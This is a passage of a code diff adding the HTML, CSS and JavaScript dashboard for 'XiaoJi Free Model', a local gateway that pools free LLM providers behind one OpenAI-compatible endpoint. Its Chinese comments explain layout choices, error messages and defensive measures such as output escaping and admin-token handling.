+  .rid{font-family:ui-monospace,Consolas,monospace;font-size:var(--fs-1);color:var(--accent);cursor:pointer;border-bottom:1px dotted var(--accent)}
+
+  /* ── 弹层内的通用行 ───────────────── */
+  /* ⚠ 原名 .mrow，与「免费模型目录」的表行同名 —— 后定义者胜，于是目录每一行都被套上
+     margin-top:10px（26px 的行被撑成 36px），而这是看不见的。2026-10-17 改名为 .drow。 */
+  .drow{display:flex;gap:8px;align-items:center;flex-wrap:wrap;margin-top:10px}
+  .drow input{flex:1;min-width:170px;margin:0}
+  .mfoot{display:flex;gap:8px;justify-content:flex-end;margin-top:14px}
+  .stat-err{color:var(--err)}
+
+  @media (max-width:980px){
+    .grid{grid-template-columns:1fr}
+    .stats{grid-template-columns:repeat(3,1fr)}
+    .topbar .tagline{display:none}
+  }
+  /* 窄屏断点: 顶栏与工具条在 520px 以下会挤成一团, 单独收一次 */
+  @media (max-width:520px){
+    body{padding:0 12px 36px}
+    .topbar{margin:0 -12px 14px;padding:11px 14px;gap:9px;flex-wrap:wrap}
+    .topbar .logo{font-size:var(--fs-3)}
+    .topbar .logo-en{display:none}
+    .tabs{margin-left:0;order:9;width:100%}
+    .tab{flex:1}
+    .stats{grid-template-columns:repeat(2,1fr)}
+    .modal{max-width:none}
+    .mask{padding:16px 10px}
+    .mbd{padding:13px 12px;max-height:72vh}
+    .pgbar select{min-width:100%}
+    .pgbar .spacer{display:none}
+    .pops{width:100%}
+    /* 单行放不下时, 窄屏优先保时间、结果、供应商与模型名, 把补充信息让出去 */
+    .chg .reason{display:none}
+    .chg .kpi{display:none}
+    /* 候选行在窄屏允许换行。一行里塞了 名字/未收录/慎用/实测徽标/备注/域名/免费数 七个元素,
+       大多带 flex:0 0 auto 或 nowrap —— 不换行时它们的 min-content 是**求和**。
+       2026-09-21 加无 Key 巡检徽标后这个和顶到 478px, 把移动端的**布局视口**整个撑大
+       (innerWidth 390→478, 整页横向错位; 因为元素自己没超视口, 只看 getBoundingClientRect 查不出来)。
+       这里选"换行"而不是"给徽标加省略号"或"裁掉域名": 换行不丢信息, 那两种都会把内容吃掉。
+       桌面(1200px)下 candbox 有 455px, 单行放得下, 所以只在窄屏生效 —— 不然 47 行全变两三行, 太乱。 */
+    #candbox .vopt{flex-wrap:wrap}
+  }
+</style>
+</head>
+<body>
+
+<div class="topbar">
+  <span class="logo"><span class="mark"><svg viewBox="0 0 24 24" fill="none" aria-hidden="true"><ellipse cx="12" cy="15.6" rx="7.6" ry="6.2" fill="#ffc61a"/><ellipse cx="12" cy="15.4" rx="5.2" ry="4.4" fill="#ffe066" opacity=".6"/><circle cx="12" cy="8.2" r="5.6" fill="#ffce33"/><path d="M10.2 3.1c.3-1.1 1.5-1.4 2.1-.6.7-.6 1.8-.1 1.7.8" stroke="#f5a800" stroke-width="1.3" stroke-linecap="round"/><circle cx="9.9" cy="7.9" r="1" fill="#4a3210"/><circle cx="14.1" cy="7.9" r="1" fill="#4a3210"/><circle cx="10.25" cy="7.55" r=".33" fill="#fff"/><circle cx="14.45" cy="7.55" r=".33" fill="#fff"/><ellipse cx="7.7" cy="9.9" rx="1.2" ry=".75" fill="#ff9a8b" opacity=".7"/><ellipse cx="16.3" cy="9.9" rx="1.2" ry=".75" fill="#ff9a8b" opacity=".7"/><path d="M12 9.9l-2 1.8h4l-2-1.8Z" fill="#ff8a1f"/><path d="M10.1 11.7h3.8L12 13.6l-1.9-1.9Z" fill="#e8720a"/><path d="M6.6 15.4c1.6-1.3 3.5-1.5 4.9-.9" stroke="#f0a800" stroke-width="1.4" stroke-linecap="round"/><path d="M9.4 21.3l-1 1.6M12 21.7v1.7M14.6 21.3l1 1.6" stroke="#ff8a1f" stroke-width="1.4" stroke-linecap="round"/></svg></span>小鸡免费模型 <span class="logo-en">XiaoJi Free Model</span></span>
+  <span class="tagline">一个端点，汇入各家免费模型 · OpenAI / Claude / Gemini / Ollama 兼容 · auto 自动路由回退 · 只接文字对话模型</span>
+  <span class="live"><span class="dot" id="livedot"></span><span id="livetxt">检测中…</span></span>
+  <nav class="tabs" role="tablist" aria-label="视图切换">
+    <button class="tab on" id="tab-dash" role="tab" aria-selected="true" data-act="view" data-view="dash">仪表盘</button>
+    <button class="tab" id="tab-play" role="tab" aria-selected="false" data-act="view" data-view="play">调试台</button>
+  </nav>
+</div>
+
+<div id="view-dash">
+<div class="grid">
+  <!-- ══ 左列：接入 · 运行状态 · 厂商清单 ══ -->
+  <div class="col">
+
+    <div class="card hero reveal">
+      <div class="eyebrow">Local model gateway</div>
+      <h2>统一出口<span class="meta">填进 WorkBuddy 或任何兼容客户端</span></h2>
+      <div class="connect">
+        <div class="kv"><span class="lbl">Base URL</span><code id="baseurl"></code><span class="tag">OpenAI 兼容</span><button class="small gray" onclick="copyText('baseurl')">复制</button></div>
+        <div class="kv"><span class="lbl">API Key</span><code id="gkey"></code><button class="small gray" id="keyeye" title="显示/隐藏明文" onclick="toggleKey()">&#128065;</button><button class="small gray" onclick="copyKey()">复制</button></div>
+        <div class="kv"><span class="lbl">模型</span><code>auto</code><span class="tag">自动路由 + 失败回退</span></div>
+      </div>
+      <p class="hint">也可填 <code>供应商名/模型名</code> 指定来源。Claude 用 <code>/v1/messages</code>、Gemini 用 <code>/v1beta</code>、Ollama 用 <code>/api/chat</code>，同一 Key。</p>
+      <!-- 手工改过 config.json 时，热重载合并了什么（2026-10-17）。内容由 renderState 填。 -->
+      <div id="cfdrift"></div>
+      <div style="margin-top:10px;display:flex;gap:8px;flex-wrap:wrap">
+        <button class="small gray" data-act="snippets">配置片段 · 一键接入各种客户端</button>
+        <button class="small gray" data-act="snapshots" title="改配置之前存一份；改坏了能一键退回（只回滚配置项，冷却/拉黑保留）">配置快照 · 存一份 / 一键回滚</button>
+      </div>
+    </div>
+
+    <div class="stats reveal" id="statsbar"></div>
+
+    <div class="card reveal">
+      <h2>供应商<span class="spacer"></span><span class="meta" id="provsum">—</span></h2>
+      <p class="desc" title="网络错误冷却 90s · Key 失效冷却 10min · 额度用完冷却到重置 · 过载停 60s · 转收费或下架自动拉黑，每天复审恢复。全部自动完成，不需要手动干预。">失败自动处理：冷却 / 回退 / 拉黑，无需手动干预</p>
+      <div class="plist" id="plist"></div>
+    </div>
+
+    <!-- 模型使用记录（2026-09-25 二次调整，采纳用户判断）：与「免费池变动」对调。
+         左列由此成为**厂商 + 运行侧**：出口怎么接 → 整体概览 → 各厂商健康 → 每次调用明细
+         → 还有哪些厂商可以接（见下一张卡）；右列则是**模型/配置侧**：加厂商 → 免费模型目录
+         → 池子进出记录。两列是两个视角，不混。 -->
+    <div class="card reveal" id="usgcard" style="display:none">
+      <h2>模型使用记录<span class="spacer"></span><span id="usgmeta" class="meta"></span></h2>
+      <p class="desc" style="margin-bottom:8px" title="auto 路由链上每次实际调用都会留痕（候选级：一次请求回退过几家就有几条）。要按请求 ID 反查同一次请求的全部轨迹，看 usage_log.json —— 那里仍保留 2000 条。">每次实际调用都会留痕，按请求 ID 可反查完整轨迹</p>
+      <!-- 模型分布汇总（2026-10-06 加）：实测最近 30 条里 26 条是同一个模型 —— 纯流水看不出
+           "auto 到底在用什么"，一排几乎一样的行反而像页面在刷屏。汇总固定在流水上方不参与滚动，
+           一眼看到"谁在干活、成功率多少、平均多快"；逐条轨迹一条没少，往下滚即可。 -->
+      <div id="usgagg" class="usgagg"></div>
+      <div class="chg-list" id="usagelist"></div>
+    </div>
+
+    <!-- 「发现更多免费厂商」（2026-09-25）：两个盒子原来嵌在「免费模型目录」卡里，
+         让那张卡长成 1625px 的卡中卡（目录 801 + 未接入 144 + 候选 525），右列因此比左列高 1038px；
+         而且三件事挤在一起谁也看不清。拆开后各说各的，两个 ID 保持不变（测试按 ID 找元素）。
+         ⚠ 2026-09-25 晚**从右列移到左列**：字号提档（11px→12.5px）后右列涨到 1500px、比左列高 154px，
+         而它是右列唯一能整块搬走的小卡（收起态 65px）。搬完两列 1423/1423、差 0px，页高只涨 10px。
+         语义上也顺：左列是"厂商维度"（已接入 7 家 → 还没接入的 17 家），右列是"模型/配置维度"。
+         ⚠ 移动前已确认 JS 只按 id 取元素（$('discovcard')），无 DOM 位置依赖。 -->
+    <div class="card reveal" id="discovcard" style="display:none">
+      <h2>发现更多免费厂商<span class="spacer"></span><span class="meta" id="discovmeta"></span><a id="discov-t" class="meta" data-act="toggle-box" data-key="discov" role="button" tabindex="0" style="color:var(--accent);cursor:pointer;margin-left:10px">展开</a></h2>
+      <!-- 默认收起（2026-09-25）：展开态 421px，会把所在列顶得比另一列高一截；
+           而且用户点名过"文字太多太杂太丑"。收起态标题行已写明里面有 17 家 / 47 家，
+           想知道有什么不必点开也能看到。展开后内容一件不少。 -->
+      <div id="discov-b" style="display:none">
+        <div id="availbox" style="display:none"></div>
+        <div id="candbox" style="display:none"></div>
+      </div>
+    </div>
+
+  </div>
+
+  <!-- ══ 右列：模型目录 · 池子变动 ══ -->
+  <div class="col">
+
+    <div class="card reveal" id="addcard">
+      <h2>添加供应商<span class="meta">填入免费 API Key，一键拉取其免费模型</span></h2>
+      <div class="row">
+        <div><label>选择厂商（或自定义）</label>
+          <div class="vpicker">
+            <button type="button" class="vbtn" id="vbtn" onclick="toggleVpop(event)"><span id="vbtntxt">— 自定义 —</span><span class="caret">&#9662;</span></button>
+            <div class="vpop" id="vpop" style="display:none"></div>
+          </div>
+        </div>
+        <div><label>标识 name</label><input id="p_name" placeholder="zhipu"></div>
+      </div>
+      <div class="row" style="margin-top:8px">
+        <div><label>Base URL（OpenAI 兼容）</label><input id="p_base" placeholder="https://open.bigmodel.cn/api/paas/v4"></div>
+      </div>
+      <div class="row" style="margin-top:8px">
+        <div><label>API Key</label><input id="p_key" placeholder="sk-..."></div>
+        <div style="flex:0 0 auto;display:flex;align-items:flex-end;gap:10px">
+          <label style="display:flex;align-items:center;gap:5px;margin:0 2px 9px 0;font-size:var(--fs-2);color:var(--text);cursor:pointer;font-weight:500;letter-spacing:0;text-transform:none"><input type="checkbox" id="p_proxy" style="width:auto">走代理</label>
+          <button class="gray" onclick="fetchFree()">拉取免费模型</button>
+        </div>
+      </div>
+      <div id="modellist" class="pickbox" style="display:none">
+        <div class="hd">
+          勾选要接入的免费文字对话模型（⭐ 推荐 · ⏳ 限时免费）
+          <a onclick="checkAll(true)">全选</a>·<a onclick="checkAll(false)">清空</a>·<a onclick="checkRec()">只选推荐</a>
+        </div>
+        <div id="modelitems"></div>
+      </div>
+      <div style="display:flex;gap:10px;align-items:center;margin-top:10px;flex-wrap:wrap">
+        <button onclick="addProvider()">添加所选模型</button>
+        <span id="addmsg" style="font-size:var(--fs-2);color:var(--sub)"></span>
+      </div>
+    </div>
+
+    <div class="card reveal">
+      <h2 title="⭐ 推荐 · ⏳ 限时免费 · ⛔ 失效（删除线）· 名单外不进池。只接能输出文字的对话模型 —— 嵌入 / 重排 / 审核 / 语音 / OCR / 纯图像视频生成会被自动排除，不会混进 auto。免费判定以上游价格元数据 + 每日自动同步的白名单为准。">免费模型目录<span class="spacer"></span>
+        <span id="rulesmeta" class="meta"></span><span id="catmeta" class="meta"></span>
+        <button class="small gray" id="wlsync" onclick="syncWhitelist()" title="立即从上游拉取最新免费名单（每日也会自动同步）">同步白名单</button>
+        <button class="small gray" onclick="refreshCatalog()">重新扫描</button>
+      </h2>
+      <div id="catalog"><span class="empty">尚未生成。配好供应商后点「重新扫描」。</span></div>
+    </div>
+
+    <!-- 免费池变动（2026-09-25 二次调整，采纳用户判断）：对调到右列末尾 —— 右列由此构成
+         完整的**模型供给链**：添加厂商 → 拉取并查看免费目录 → 池子进出记录（谁进了谁出了）。
+         它和左列的「模型使用记录」（消费侧）是两个不同视角，不该混在一列。 -->
+    <div class="card reveal" id="chgcard" style="display:none">
+      <h2>免费池变动<span class="spacer"></span><span id="chgmeta" class="meta"></span></h2>
+      <p class="desc" style="margin-bottom:8px" title="免费池里所有进出都会留痕：新增 / 移出、限时活动开始 / 结束、自动隔离与恢复、体检拉黑。保留最近 50 条。">免费池的每一次进出都在这里留痕</p>
+      <!-- 限时活动巡检的告警出口。巡检本身每 6 小时自动跑, 结论(活动开始/结束)直接记进下面的变动列表,
+           所以不再单开一个展示模块 —— 用户明确问过"有必要多这个显示模块吗", 答案是不必要。
+           只有"巡检自身失效"这种需要人介入的事才在这里显式提示。 -->
+      <div id="promowarn"></div>
+      <div class="chg-list" id="changes"></div>
+    </div>
+
+  </div>
+</div>
+</div>
+
+<!-- ══ 调试台：只做一件事 —— 确认网关链路是通的。不复用仪表盘的 api()，因为它走 r.json() 吃不了 SSE ══ -->
+<div id="view-play" style="display:none">
+  <div class="card reveal">
+    <div class="eyebrow">Playground</div>
+    <h2>链路自检<span class="meta">打的是网关自身的 <code>/v1/chat/completions</code>，走完整路由链</span></h2>
+    <p class="desc">用途只有一个：<b>确认网关链路是通的</b>（和真实客户端走的是同一条路）。日常对话请用你自己的客户端 —— 这里不提供温度、对比这类调参，避免和真实使用场景产生错觉。</p>
+
+    <div class="pgbar">
+      <div class="pgbar-fld pgbar-model"><select id="pg_model" aria-label="模型"></select></div>
+      <div class="pgbar-act">
+        <button class="small gray" data-act="play-clear">清空</button>
+        <button class="small gray" id="pg_stop" data-act="play-stop" disabled>停止</button>
+        <button id="pg_run" data-act="play-run">发送</button>
+      </div>
+    </div>
+
+    <div class="pgsug">
+      <span class="pgsug-lbl">一键填</span>
+      <button class="pgsug-chip" data-act="pg-fill" data-text="用一句话说明你是什么模型">介绍自己</button>
+      <button class="pgsug-chip" data-act="pg-fill" data-text="用三句话总结相对论的核心思想">长文本</button>
+      <button class="pgsug-chip" data-act="pg-fill" data-text="1+1=? 用一句话回答">算术</button>
+    </div>
+
+    <div class="pgstat-bar">
+      <span class="pgpill"><i>模型</i><b id="pg_name_a">auto</b></span>
+      <span class="pgpill"><i>首字</i><b id="pg_stat_ttfb">—</b></span>
+      <span class="pgpill"><i>总耗时</i><b id="pg_stat_ms">—</b></span>
+      <span class="pgpill"><i>Token</i><b id="pg_stat_tok">—</b></span>
+      <span class="pgpill"><i>结束</i><b id="pg_stat_fin">—</b></span>
+      <span class="pgpill pgpill-wide"><i>作答</i><b id="pg_stat_prov">—</b></span>
+      <span class="pgpill pgpill-rid"><i>请求 ID</i><b id="pg_stat_rid">—</b></span>
+    </div>
+
+    <div class="pgout-wrap" id="pg_col_a">
+      <div class="pgout-hd"><span class="dot"></span><span id="pg_stat_a">就绪 · 等待发送</span></div>
+      <div class="pgout" id="pg_out_a" role="log" aria-live="polite"></div>
+    </div>
+
+    <div class="pgin">
+      <textarea id="pg_in" rows="3" placeholder="输入提示词，Ctrl/Cmd + Enter 发送&#10;（发的是真实请求，会消耗免费额度 —— 走的是同一个路由池，不会额外扣费）"></textarea>
+      <div class="pgin-foot"><span class="pgtip" id="pg_tip">流式输出 · 停止会同时中止上游请求（不再空烧额度） · 请求 ID 会记到上方状态条</span></div>
+    </div>
+  </div>
+</div>
+
+<footer>小鸡免费模型 XiaoJi Free Model · 全部数据只留在本机（127.0.0.1）</footer>
+
+<!-- 通用弹层：Key 管理 / 配置片段 / 二次确认都复用它 -->
+<div class="mask" id="modal" style="display:none" role="dialog" aria-modal="true" aria-labelledby="modal_title">
+  <div class="modal">
+    <div class="mhd"><h3 id="modal_title">—</h3><span class="spacer"></span><button class="small gray" data-act="close-modal" aria-label="关闭">关闭</button></div>
+    <div class="mbd" id="modal_body"></div>
+  </div>
+</div>
+
+<div id="toasts" aria-live="polite"></div>
+
+<script>
+const $ = (id) => document.getElementById(id)
+let LAST = []      // 已接入的供应商（/api/state）
+let PRESETS = []   // 服务端每天推导的厂商名单（/api/state.presets）
+// 静态块的"条件请求"状态: r/p 是服务端给的内容版本号(sha1 前 16 位), 缓存是上次拿到的副本。
+// 服务端发现版本未变时回 null, 这里就用缓存 —— 省掉每 8 秒 34KB 重复传输(见 /api/state 注释)。
+const STATEV = { r: '', p: '' }
+let PRESETS_CACHE = []
+let RULES_CACHE = null
+// 已配置的代理地址（`host:port`），来自 /api/state 的 proxyAlive.addr。
+// 为什么要有它：告警文案要点名到端口才可行动，但**端口是用户自己配的**（config.proxy），
+// 不能把开发机上的端口写死在代码里 —— 那对别人的机器是错的。
+let PROXY_ADDR = ''
+let VOPEN = false  // 厂商选择器是否展开
+let PROV_SIG = ''  // 上次渲染供应商卡片时的数据签名（没变就跳过重绘）
+
+// 厂商 logo 本地映射: vendor.name → /assets/logos/<file>。全部 26 家都已备本地 SVG
+// (simple-icons 的注入品牌色 + 官网无资源的手工画品牌色方块), 不再走首字母 fallback。
+// Edge headless 对 .ico 渲染不稳(显示破图), 一律用 SVG。映射与 assets/logos/manifest.json 同源。
+const VENDOR_LOGOS = {
+  groq: 'groq.svg',
+  gemini: 'gemini.svg',
+  mistral: 'mistral.svg',
+  openrouter: 'openrouter.svg',
+  cohere: 'cohere.svg',
+  kilo: 'kilo.svg',
+  nvidia: 'nvidia.svg',
+  ollama: 'ollama.svg',
+  hf: 'hf.svg',
+  ovh: 'ovh.svg',
+  cloudflare: 'cloudflare.svg',
+  siliconflow: 'siliconflow.svg',
+  zhipu: 'zhipu.svg',
+  modelscope: 'modelscope.svg',
+  amd: 'amd.svg',
+  sensenova: 'sensenova.svg',
+  empero: 'empero.svg',
+  llm7: 'llm7.svg',
+  aionlabs: 'aionlabs.svg',
+  longcat: 'longcat.svg',
+  cerebras: 'cerebras.svg',
+  deepseek: 'deepseek.svg',
+  kimi: 'kimi.svg',
+  bailian: 'bailian.svg',
+  volc: 'volc.svg',
+  bai: 'bai.svg',
+}
+
+function toast(title, detail, type='ok', ms=4200){
+  const d = document.createElement('div')
+  d.className = 'toast ' + type
+  d.innerHTML = `<b>${esc(title)}</b>` + (detail ? `<div class="d">${esc(detail)}</div>` : '')
+  $('toasts').appendChild(d)
+  setTimeout(() => { d.style.transition='.25s'; d.style.opacity='0'; setTimeout(()=>d.remove(),260) }, ms)
+}
+// ⚠ 必须同时转义单引号与反斜杠。上游的模型名/厂商名是不可信输入, 早期它们被直接拼进
+// 内联 handler 的 JS 字符串里(如 onclick="toggleModel('id','${esc(m)}')") —— 只转义 &<>"
+// 的话, 名字里一个单引号就能闭合字符串并注入任意代码。现已改为 data-* + 事件委托
+// (见下方 delegation), 从根上不再进入 JS 解析; 这里补全转义作为第二道防线。
+const esc = (s) => String(s==null?'':s).replace(/[&<>"'\\]/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;','\\':'&#92;'}[c]))
+const fmtTime = (iso) => { if(!iso) return '—'; const d=new Date(iso); const p=n=>String(n).padStart(2,'0'); return `${d.getMonth()+1}月${d.getDate()}日 ${p(d.getHours())}:${p(d.getMinutes())}:${p(d.getSeconds())}` }
+// 相对时间: 用于"免费体检"这类需要一眼看出"多久没跑了"的场景
+const fmtAgo = (ms) => { if(ms==null||isNaN(ms)) return '—'; const m=Math.floor(ms/60000); if(m<1) return '刚刚'; if(m<60) return m+' 分钟前'; const h=Math.floor(m/60); if(h<24) return h+' 小时前'; return Math.floor(h/24)+' 天前' }
+// 统计格里的时间不需要精确到秒，去掉秒能让 6 格等高、整条更紧凑
+const fmtShort = (iso) => { if(!iso) return '—'; const d=new Date(iso); const p=n=>String(n).padStart(2,'0'); return `${d.getMonth()+1}月${d.getDate()}日 ${p(d.getHours())}:${p(d.getMinutes())}` }
+// 毫秒转人话: 1 秒以下用毫秒、以上用秒。使用记录与链路自检都要用, 所以放在通用区。
+const fmtMs = (ms) => { if (ms == null || !isFinite(ms)) return '—'; return ms < 1000 ? Math.round(ms) + ' ms' : (ms / 1000).toFixed(ms < 10000 ? 1 : 0) + ' s' }
+// 大数字压缩: 配额常是 6 位数(token 更是 7~9 位), 铺开会把卡片底行挤成两行。
+const fmtBig = (n) => { if (n == null || !isFinite(n)) return '—'; if (n >= 1e9) return (n / 1e9).toFixed(1) + 'B'; if (n >= 1e6) return (n / 1e6).toFixed(1) + 'M'; if (n >= 1e4) return (n / 1e3).toFixed(1) + 'k'; return String(Math.round(n)) }
+// 秒转人话时长: 上游的 `x-ratelimit-reset-*` 是秒数, 直接显示"179.56 秒"没人读得懂。
+const fmtDurSec = (s) => { if (s == null || !isFinite(s)) return '—'; if (s < 60) return Math.round(s) + ' 秒'; if (s < 3600) return Math.round(s / 60) + ' 分钟'; return (s / 3600).toFixed(1) + ' 小时' }
+
+// 服务端的 lastError 是给排查用的机器可读串（ISO 时间戳 + HTTP 状态码），直接铺在页面上
+// 又长又难懂。这里翻译成大白话：时间照旧，状态码换成"到底怎么了"。
+const ERR_HINT = [
+  [/HTTP 401|HTTP 403/, 'Key 无效或没有权限'],
+  [/HTTP 402/, '该模型已开始收费'],
+  // ⚠ 404 曾经被写成"模型不存在或已下架" —— 这是**谎报**(2026-09-21 用户质问"没找到不就是已下架吗")。
+  //   404 有三种病因, 处置完全相反: ①模型真下架 -> 拉黑; ②接入点路径写错 -> 模型其实好的;
+  //   ③Key 没有该模型权限 -> 账号问题。网关的实际动作只是"冷却该模型 1 小时"(见 markFail),
+  //   根本没做下架判定。文案必须描述**真实行为**, 否则用户会以为系统已经把它踢出去了。
+  [/HTTP 404/, '未找到该模型（已临时跳过 1 小时；可能下架，也可能是接入点/Key 权限问题，未拉黑）'],
+  [/HTTP 408|HTTP 504/, '上游超时'],
+  [/HTTP 429/, '请求太频繁，被限流'],
+  [/HTTP 5\d\d/, '上游服务故障'],
+  [/HTTP 4\d\d/, '请求被上游拒绝'],
+]
+function humanErr(s){
+  if (!s) return ''
+  let out = String(s)
+  const m = out.match(/^\d{4}-\d{2}-\d{2}T[\d:.]+Z\s*/)
+  const at = m ? fmtTime(m[0].trim()) : ''
+  if (m) out = out.slice(m[0].length)
+  for (const [re, txt] of ERR_HINT) if (re.test(out)) { out = out.replace(/HTTP \d{3}/, txt); break }
+  return (at ? at + ' · ' : '') + out
+}
+// 同一家的模型名常有共同前缀（Gemini 全是 models/xxx），逐个重复显示纯属噪音。
+// 只剥离以 "/" 结尾的公共前缀 —— 像 gpt-oss-120b / gpt-oss-20b 若剥到 "gpt-oss-"
+// 反而把名字变成看不懂的 120b / 20b，那是帮倒忙。
+function commonModelPrefix(list){
+  if (!list || list.length < 2) return ''
+  let p = list[0]
+  for (const s of list) { while (p && !s.startsWith(p)) p = p.slice(0, -1) }
+  const i = p.lastIndexOf('/')
+  return i >= 0 ? p.slice(0, i + 1) : ''
+}
+
+// 管理令牌 —— 只在服务端 auth.mode='token' 时才需要(config.json 里配)。
+// 默认的 local 模式下这里恒为空串, 等于不带这个头, 行为与之前完全一致。
+// 取法两种: URL 上带 #token=xxx(打开一次即存进 sessionStorage), 或上次已存过。
+// 存 sessionStorage 而不是 localStorage: 关掉浏览器就没了, 少一个长期留存的密钥。
+function readAdminToken(){
+  try {
+    const h = new URLSearchParams(String(location.hash || '').replace(/^#/, ''))
+    const t = h.get('token')
+    if (t) { sessionStorage.setItem('xiaoji_admin_token', t); return t }
+    return sessionStorage.getItem('xiaoji_admin_token') || ''
+  } catch { return '' }
+}
+const ATOKEN = readAdminToken()
+
+async function api(path, opt){
+  const o = Object.assign({}, opt)
+  const needAuth = (o.method && String(o.method).toUpperCase() === 'POST') || o.auth
+  delete o.auth
+  // 管理令牌: 每个 /api 请求都带上(空串等于不带)。必须在 needAuth 之前合并,
+  // 否则会被下面的 Object.assign(h, ...) 覆盖掉。
+  if (ATOKEN) o.headers = Object.assign({ 'x-admin-token': ATOKEN }, o.headers || {})
+  // 所有 POST 必须带 application/json —— 服务端有 CSRF 防护, 缺这个头会直接 415 拒绝。
+  // 这里统一兜底: 以前没默认值, toggleOne 漏传就变成"点了没反应却提示成功"(415 被静默吞掉)。
+  if (needAuth) {
+    const h = o.method && String(o.method).toUpperCase() === 'POST' ? { 'content-type': 'application/json' } : {}
+    // 服务端对管理类写操作要求网关 Key(防本机越权改配置 / 解除扣费拉黑)。
+    // 少数读接口(如逐 Key 列表)也要求鉴权 —— 那些调用点显式传 { auth: true }。
+    if (GKEY) h.authorization = 'Bearer ' + GKEY
+    o.headers = Object.assign(h, o.headers || {})
+  }
+  let r
+  try { r = await fetch(path, o) } catch (e) { return { ok: false, error: '网络错误: ' + e.message } }
+  let body = null
+  try { body = await r.json() } catch {}
+  // 统一把 HTTP 成败暴露成 body.ok, 让调用方不必各自解析状态码
+  if (body && typeof body === 'object') {
+    if (body.ok === undefined) body.ok = r.ok
+    if (!r.ok && !body.error) body.error = 'HTTP ' + r.status
+    // token 模式下的 401 必须给出可执行的指引 —— 否则页面只是"全都加载不出来",
+    // 用户根本猜不到是缺管理令牌(而不是网关没启动)。
+    if (r.status === 401 && body.error && body.error.code === 'admin_token_required') {
+      body.error = '该网关启用了管理令牌：请在地址后加 #token=你的令牌 再打开（本次会话内有效）'
+    }
+    return body
+  }
+  return { ok: r.ok, error: r.ok ? '' : 'HTTP ' + r.status }
+}
+
+let GKEY = ''
+let KEY_SHOWN = false
+const maskKey = (k) => !k ? '—' : (k.length <= 12 ? k.slice(0, 4) + '…' : k.slice(0, 8) + '············' + k.slice(-4))
+function toggleKey(){
+  KEY_SHOWN = !KEY_SHOWN
+  $('gkey').textContent = KEY_SHOWN ? GKEY : maskKey(GKEY)
+  $('keyeye').innerHTML = KEY_SHOWN ? "&#128274;" : "&#128065;"
+  $('keyeye').title = KEY_SHOWN ? '隐藏明文' : '显示明文'
+}
+function copyKey(){
+  navigator.clipboard.writeText(GKEY).then(() => toast('已复制完整 Key')).catch(() => toast('复制失败', '请手动选中复制', 'err'))
+}
+
+async function refresh(){
+  let s
+  // ⚠ 带上已知的静态块版本(rv/pv): 服务端据此判断"白名单视图 / 厂商预设"有没有变,
+  //   没变就不回这两块(它们占 /api/state 的 65%), 省掉每 8 秒搬运 34KB 与一次 computePresets。
+  //   版本号来自上一次响应; 首次为空 -> 服务端全量回。
+  try {
+    const qs = (STATEV.r || STATEV.p) ? `?rv=${STATEV.r || ''}&pv=${STATEV.p || ''}` : ''
+    s = await api('/api/state' + qs)
+  } catch { setLive(false); return }
+  if (!s || !s.providers) { setLive(false); return }
+  setLive(true)
+  LAST = s.providers
+  // 记住"用户配置的代理地址"，供下面几处告警文案点名端口用（见 PROXY_ADDR 的注释）。
+  if (s.proxyAlive && s.proxyAlive.addr) PROXY_ADDR = s.proxyAlive.addr
+  // 记住本轮版本号, 供下次轮询使用
+  if (s.rulesetV) STATEV.r = s.rulesetV
+  if (s.presetsV) STATEV.p = s.presetsV
+  // 完整网关 Key 由服务端在返回本页时注入 window.__GK__。
+  // 为什么不再从 /api/state 取: 那个接口是免鉴权的 GET, 回传明文 Key 等于本机任何脚本/
+  // 浏览器扩展都能拿到它, 进而调用全部写接口(改 Key、解除扣费拉黑)。现在 /api/state 只回掩码。
+  GKEY = window.__GK__ || ''
+  if (!GKEY) {
+    // 占位符没被替换 —— 多半是把 dashboard.html 当本地文件直接打开了。写操作会 401, 必须说清楚。
+    $('gkey').textContent = s.gatewayKey || '（未注入）'
+    if (!window.__GKWARNED) {
+      window.__GKWARNED = true
+      toast('网关 Key 未注入', '请通过 http://localhost:' + s.port + ' 打开仪表盘；直接打开本地 html 文件只能看，不能改', 'err', 0)
+    }
+  } else {
+    $('gkey').textContent = KEY_SHOWN ? GKEY : maskKey(GKEY)
+  }
+  $('keyeye').innerHTML = KEY_SHOWN ? "&#128274;" : "&#128065;"
+  $('baseurl').textContent = `http://localhost:${s.port}/v1`
+  // 配置损坏/从备份恢复: 常驻红色告警, 不自动消失 —— 这件事必须让人看见(可能刚丢了 Key)
+  if (s.configRecovered) {
+    const cr = s.configRecovered
+    if (!window.__CRSHOWN) {
+      window.__CRSHOWN = true
+      toast('⚠ 配置文件曾损坏',
+        (cr.backup ? '损坏文件已留档为 ' + cr.backup + '。' : '')
+        + (cr.restoredFrom ? '已从 ' + cr.restoredFrom + ' 恢复供应商配置。' : '未能恢复，当前是空配置，请重新添加供应商。')
+        + (cr.error ? ' 原因：' + cr.error : ''),
+        'err', 0)
+    }
+  }
+
+  // 手工改过 config.json：热重载合并了什么（2026-10-17）。不合并的项（新增供应商）要明说。
+  ;(() => {
+    const box = $('cfdrift')
+    if (!box) return
+    const d = s.configDrift
+    box.innerHTML = d
+      ? '<div class="warnnote soft"><b>检测到手工改动</b>：已热重载 ' + d.count + ' 项（'
+        + esc((d.items || []).join('、')) + '）· ' + esc(fmtShort(d.at))
+        + '<span class="d">改的是 config.json。新增供应商不会自动接入（要走免费校验），需重启网关生效。</span></div>'
+      : ''
+  })()
+  // 手工把 config.json 的 port 改了、但还没重启 —— 端口没法热改(server 已经 listen 在旧端口上)。
+  // 不提示的话用户改完发现"什么都没变", 会以为自己改错了地方。
+  if (s.portPending && s.portPending !== s.port && !window.__PORTNOTIFIED) {
+    window.__PORTNOTIFIED = true
+    toast('端口已改，重启后生效',
+      `config.json 里的 port 现在是 ${s.portPending}，但网关仍监听在 ${s.port} —— 端口切换必须重启。`
+      + '双击「小鸡开关.bat」选 [3] Restart 即可。',
+      'warn', 0)
+  }
+
+  // 厂商名单不是写死的：服务端每次请求都拿"当前白名单"重新推导（computePresets），
+  // 所以免费厂商自己会冒出来、掉出免费的自己会沉到「无免费档」，不需要人工维护。
+  // ⚠ 服务端在版本未变时回 null(见 /api/state 的 rv/pv) -> 用上次缓存的副本, 不覆盖。
+  if (s.presets) PRESETS_CACHE = s.presets
+  PRESETS = PRESETS_CACHE
+  if (VOPEN) renderVlist(($('vsearch') || {}).value || '')
+  // 每 8 秒整块重建供应商卡片(几十个 chip + 展开态)是这页最重的一次重绘, 而绝大多数轮询里
+  // 数据根本没变。先用签名比一下, 没变就跳过 —— 展开态、滚动位置、hover 都不会被打断。
